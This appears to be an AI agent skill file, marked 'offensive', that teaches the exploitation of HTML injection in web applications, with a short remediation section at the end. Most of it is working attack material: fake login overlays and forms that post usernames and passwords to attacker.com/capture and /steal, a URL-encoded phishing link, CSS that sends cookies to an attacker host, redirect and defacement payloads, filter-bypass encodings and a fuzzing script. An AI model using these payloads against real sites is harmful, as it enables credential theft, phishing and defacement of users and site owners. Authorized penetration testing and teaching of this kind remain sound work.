---
name: html-injection-testing
description: "Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# HTML Injection Testing

## Purpose

Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- Tamper Data or similar proxy
- cURL for testing payloads

### Required Knowledge
- HTML fundamentals
- HTTP request/response structure
- Web application input handling
- Difference between HTML injection and XSS

## Outputs and Deliverables

1. **Vulnerability Report** - Identified injection points
2. **Exploitation Proof** - Demonstrated content manipulation
3. **Impact Assessment** - Potential phishing and defacement risks
4. **Remediation Guidance** - Input validation recommendations

## Core Workflow

### Phase 1: Understanding HTML Injection

HTML injection occurs when user input is reflected in web pages without proper sanitization:

```html
<!-- Vulnerable code example -->
<div>
    Welcome, <?php echo $_GET['name']; ?>
</div>

<!-- Attack input -->
?name=<h1>Injected Content</h1>

<!-- Rendered output -->
<div>
    Welcome, <h1>Injected Content</h1>
</div>
```

Key differences from XSS:
- HTML injection: Only HTML tags are rendered
- XSS: JavaScript code is executed
- HTML injection is often stepping stone to XSS

Attack goals:
- Modify website appearance (defacement)
- Create fake login forms (phishing)
- Inject malicious links
- Display misleading content

### Phase 2: Identifying Injection Points

Map application for potential injection surfaces:

```
1. Search bars and search results
2. Comment sections
3. User profile fields
4. Contact forms and feedback
5. Registration forms
6. URL parameters reflected on page
7. Error messages
8. Page titles and headers
9. Hidden form fields
10. Cookie values reflected on page
```

Common vulnerable parameters:
```
?name=
?user=
?search=
?query=
?message=
?title=
?content=
?redirect=
?url=
?page=
```

### Phase 3: Basic HTML Injection Testing

Test with simple HTML tags:

```html
<!-- Basic text formatting -->
<h1>Test Injection</h1>
<b>Bold Text</b>
<i>Italic Text</i>
<u>Underlined Text</u>
<font color="red">Red Text</font>

<!-- Structural elements -->
<div style="background:red;color:white;padding:10px">Injected DIV</div>
<p>Injected paragraph</p>
<br><br><br>Line breaks

<!-- Links -->
<a href="http://attacker.com">Click Here</a>
<a href="http://attacker.com">Legitimate Link</a>

<!-- Images -->
<img src="http://attacker.com/image.png">
<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
```

Testing workflow:
```bash
# Test basic injection
curl "http://target.com/search?q=<h1>Test</h1>"

# Check if HTML renders in response
curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"

# Test in URL-encoded form
curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
```

### Phase 4: Types of HTML Injection

#### Stored HTML Injection

Payload persists in database:

```html
<!-- Profile bio injection -->
Name: John Doe
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <h1>Site Under Maintenance</h1>
     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
     </div>

<!-- Comment injection -->
Great article!
<form action="http://attacker.com/steal" method="POST">
    <input name="username" placeholder="Session expired. Enter username:">
    <input name="password" type="password" placeholder="Password:">
    <input type="submit" value="Login">
</form>
```

#### Reflected GET Injection

Payload in URL parameters:

```html
<!-- URL injection -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">

<!-- Search result injection -->
http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
```

#### Reflected POST Injection

Payload in POST data:

```bash
# POST injection test
curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
     http://target.com/submit

# Form field injection
curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
     http://target.com/register
```

#### URL-Based Injection

Inject into displayed URLs:

```html
<!-- If URL is displayed on page -->
http://target.com/page/<h1>Injected</h1>

<!-- Path-based injection -->
http://target.com/users/<img src=x>/profile
```

### Phase 5: Phishing Attack Construction

Create convincing phishing forms:

```html
<!-- Fake login form overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:white;z-index:9999;padding:50px;">
    <h2>Session Expired</h2>
    <p>Your session has expired. Please log in again.</p>
    <form action="http://attacker.com/capture" method="POST">
        <label>Username:</label><br>
        <input type="text" name="username" style="width:200px;"><br><br>
        <label>Password:</label><br>
        <input type="password" name="password" style="width:200px;"><br><br>
        <input type="submit" value="Login">
    </form>
</div>

<!-- Hidden credential stealer -->
<style>
    input { background: url('http://attacker.com/log?data=') }
</style>
<form action="http://attacker.com/steal" method="POST">
    <input name="user" placeholder="Verify your username">
    <input name="pass" type="password" placeholder="Verify your password">
    <button>Verify</button>
</form>
```

URL-encoded phishing link:
```
http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
```

### Phase 6: Defacement Payloads

Website appearance manipulation:

```html
<!-- Full page overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>HACKED BY SECURITY TESTER</h1>
</div>

<!-- Content replacement -->
<style>body{display:none}</style>
<body style="display:block !important">
    <h1>This site has been compromised</h1>
</body>

<!-- Image injection -->
<img src="http://attacker.com/defaced.jpg" 
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">

<!-- Marquee injection (visible movement) -->
<marquee behavior="alternate" style="font-size:50px;color:red;">
    SECURITY VULNERABILITY DETECTED
</marquee>
```

### Phase 7: Advanced Injection Techniques

#### CSS Injection

```html
<!-- Style injection -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('http://attacker.com/log')">Content</div>
```

#### Meta Tag Injection

```html
<!-- Redirect via meta refresh -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">

<!-- CSP bypass attempt -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### Form Action Override

```html
<!-- Hijack existing form -->
<form action="http://attacker.com/steal">

<!-- If form already exists, add input -->
<input type="hidden" name="extra" value="data">
</form>
```

#### iframe Injection

```html
<!-- Embed external content -->
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```

### Phase 8: Bypass Techniques

Evade basic filters:

```html
<!-- Case variations -->
<H1>Test</H1>
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding variations -->
&#60;h1&#62;Encoded&#60;/h1&#62;
%3Ch1%3EURL%20Encoded%3C%2Fh1%3E

<!-- Tag splitting -->
<h
1>Split Tag</h1>

<!-- Null bytes -->
<h1%00>Null Byte</h1>

<!-- Double encoding -->
%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E

<!-- Unicode encoding -->
\u003ch1\u003eUnicode\u003c/h1\u003e

<!-- Attribute-based -->
<div onmouseover="alert(1)">Hover me</div>
<img src=x onerror=alert(1)>
```

### Phase 9: Automated Testing

#### Using Burp Suite

```
1. Capture request with potential injection point
2. Send to Intruder
3. Mark parameter value as payload position
4. Load HTML injection wordlist
5. Start attack
6. Filter responses for rendered HTML
7. Manually verify successful injections
```

#### Using OWASP ZAP

```
1. Spider the target application
2. Active Scan with HTML injection rules
3. Review Alerts for injection findings
4. Validate findings manually
```

#### Custom Fuzzing Script

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target = "http://target.com/search"
param = "q"

payloads = [
    "<h1>Test</h1>",
    "<b>Bold</b>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<a href='http://evil.com'>Click</a>",
    "<div style='color:red'>Styled</div>",
    "<marquee>Moving</marquee>",
    "<iframe src='http://evil.com'></iframe>",
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded}"
    
    try:
        response = requests.get(url, timeout=5)
        if payload.lower() in response.text.lower():
            print(f"[+] Possible injection: {payload}")
        elif "<h1>" in response.text or "<b>" in response.text:
            print(f"[?] Partial reflection: {payload}")
    except Exception as e:
        print(f"[-] Error: {e}")
```

### Phase 10: Prevention and Remediation

Secure coding practices:

```php
// PHP: Escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// PHP: Strip tags
echo strip_tags($user_input);

// PHP: Allow specific tags only
echo strip_tags($user_input, '<p><b><i>');
```

```python
# Python: HTML escape
from html import escape
safe_output = escape(user_input)

# Python Flask: Auto-escaping
{{ user_input }}  # Jinja2 escapes by default
{{ user_input | safe }}  # Marks as safe (dangerous!)
```

```javascript
// JavaScript: Text content (safe)
element.textContent = userInput;

// JavaScript: innerHTML (dangerous!)
element.innerHTML = userInput;  // Vulnerable!

// JavaScript: Sanitize
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

Server-side protections:
- Input validation (whitelist allowed characters)
- Output encoding (context-aware escaping)
- Content Security Policy (CSP) headers
- Web Application Firewall (WAF) rules

## Quick Reference

### Common Test Payloads

| Payload | Purpose |
|---------|---------|
| `<h1>Test</h1>` | Basic rendering test |
| `<b>Bold</b>` | Simple formatting |
| `<a href="evil.com">Link</a>` | Link injection |
| `<img src=x>` | Image tag test |
| `<div style="color:red">` | Style injection |
| `<form action="evil.com">` | Form hijacking |

### Injection Contexts

| Context | Test Approach |
|---------|---------------|
| URL parameter | `?param=<h1>test</h1>` |
| Form field | POST with HTML payload |
| Cookie value | Inject via document.cookie |
| HTTP header | Inject in Referer/User-Agent |
| File upload | HTML file with malicious content |

### Encoding Types

| Type | Example |
|------|---------|
| URL encoding | `%3Ch1%3E` = `<h1>` |
| HTML entities | `&#60;h1&#62;` = `<h1>` |
| Double encoding | `%253C` = `<` |
| Unicode | `\u003c` = `<` |

## Constraints and Limitations

### Attack Limitations
- Modern browsers may sanitize some injections
- CSP can prevent inline styles and scripts
- WAFs may block common payloads
- Some applications escape output properly

### Testing Considerations
- Distinguish between HTML injection and XSS
- Verify visual impact in browser
- Test in multiple browsers
- Check for stored vs reflected

### Severity Assessment
- Lower severity than XSS (no script execution)
- Higher impact when combined with phishing
- Consider defacement/reputation damage
- Evaluate credential theft potential

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
